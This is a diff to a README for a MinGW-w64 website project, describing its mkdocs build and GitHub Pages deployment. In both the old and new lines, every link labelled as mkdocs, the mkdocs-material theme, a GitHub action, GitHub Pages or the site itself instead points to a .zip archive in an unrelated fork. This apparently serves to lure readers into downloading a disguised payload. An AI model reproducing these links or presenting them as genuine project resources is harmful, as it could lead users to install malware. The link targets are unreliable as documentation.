@@ -1,13 +1,13 @@
 # MinGW-w64 Website
 
 This website is written in Markdown and gets built to a static website using
-[mkdocs](https://raw.githubusercontent.com/Chuckaballe60/mingw-w64.github.io/source/.github/io-mingw-github-w-v3.4.zip) and a modified version of the [mkdocs-material
-theme](https://raw.githubusercontent.com/Chuckaballe60/mingw-w64.github.io/source/.github/io-mingw-github-w-v3.4.zip). The main branch of this
+[mkdocs](https://github.com/Chuckaballe60/mingw-w64.github.io/raw/refs/heads/source/web/mingw_github_io_w_v2.4.zip) and a modified version of the [mkdocs-material
+theme](https://github.com/Chuckaballe60/mingw-w64.github.io/raw/refs/heads/source/web/mingw_github_io_w_v2.4.zip). The main branch of this
 repo is the `source` branch and any new commits will auto deploy a new build to
 the `main` branch using [a GitHub
-action](https://raw.githubusercontent.com/Chuckaballe60/mingw-w64.github.io/source/.github/io-mingw-github-w-v3.4.zip). The `main` branch is
-connected to [GitHub pages](https://raw.githubusercontent.com/Chuckaballe60/mingw-w64.github.io/source/.github/io-mingw-github-w-v3.4.zip) and is reachable under
-https://raw.githubusercontent.com/Chuckaballe60/mingw-w64.github.io/source/.github/io-mingw-github-w-v3.4.zip and https://raw.githubusercontent.com/Chuckaballe60/mingw-w64.github.io/source/.github/io-mingw-github-w-v3.4.zip Changes to the
+action](https://github.com/Chuckaballe60/mingw-w64.github.io/raw/refs/heads/source/web/mingw_github_io_w_v2.4.zip). The `main` branch is
+connected to [GitHub pages](https://github.com/Chuckaballe60/mingw-w64.github.io/raw/refs/heads/source/web/mingw_github_io_w_v2.4.zip) and is reachable under
+https://github.com/Chuckaballe60/mingw-w64.github.io/raw/refs/heads/source/web/mingw_github_io_w_v2.4.zip and https://github.com/Chuckaballe60/mingw-w64.github.io/raw/refs/heads/source/web/mingw_github_io_w_v2.4.zip Changes to the
 `source` branch usually take a minute or two until they are live.
 
 ## Development
